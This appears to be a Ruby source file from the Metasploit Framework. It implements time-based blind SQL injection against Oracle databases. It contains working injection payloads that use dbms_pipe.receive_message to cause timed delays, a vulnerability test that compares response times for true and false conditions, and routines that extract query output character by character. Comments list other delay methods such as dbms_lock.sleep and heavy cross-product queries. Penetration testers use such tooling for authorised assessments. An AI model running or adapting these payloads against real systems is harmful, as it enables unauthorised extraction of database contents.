#
#   Time-Based Blind SQL injection support for Oracle Database
#
class Msf::Exploit::SQLi::Oraclei::TimeBasedBlind < Msf::Exploit::SQLi::Oraclei::Common
  HEAVYQUERY_DETECTION_SAMPLE = 10 # number of times to check if the block takes a delay of @sleepdelay

  def initialize(datastore, framework, user_output, opts = {}, &query_proc)
    # NOTE: EXECUTE permission must be granted on the dbms_pipe package
    # this trick to generate delays could be replaced with dbms_lock.sleep, which would require EXECUTE permissions on the dbms_lock package
    # a third option is to use heavy queries, using the cross product for example, less reliable, but should work in all cases
    @sleepdelay = datastore['SqliDelay'] || 1
    super
  end

  def run_sql(query, output_charset = nil)
    if output_charset.is_a?(Range) && output_charset.count > 0
      known_bits, bits_to_guess = get_bitmask(output_charset)
    else
      known_bits = 0
      bits_to_guess = 8
    end
    vprint_status "{SQLi} Executing (#{query})"
    if @hex_encode_strings
      query = hex_encode_strings(query)
      vprint_status "{SQLi} Encoded to (#{query})"
    end
    # first, get the length of the output
    output_length = blind_detect_length(query, true)
    vprint_status "{SQLi} Time-based injection: expecting output of length #{output_length}"
    # now, get the output, of the given length
    blind_dump_data(query, output_length, known_bits, bits_to_guess, true)
  end

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true.
  #  @return [Boolean] whether the target is detected as vulnerable or not
  #
  def test_vulnerable
    # run_sql and check if output is what's expected, or just check for delays?
    out_true = blind_request("'a'=(select case when 1=1 then 'a'||dbms_pipe.receive_message(('a'),#{@sleepdelay}) else NULL" \
" end from dual)")
    out_false = blind_request("'a'=(select case when 1=2 then 'a'||dbms_pipe.receive_message(('a'),#{@sleepdelay}) else NULL" \
" end from dual)")
    out_true && !out_false
  end

  private

  def blind_request(query)
    time = Time.now
    @query_proc.call(query)
    diff = Time.now - time
    diff >= @sleepdelay
  end
end
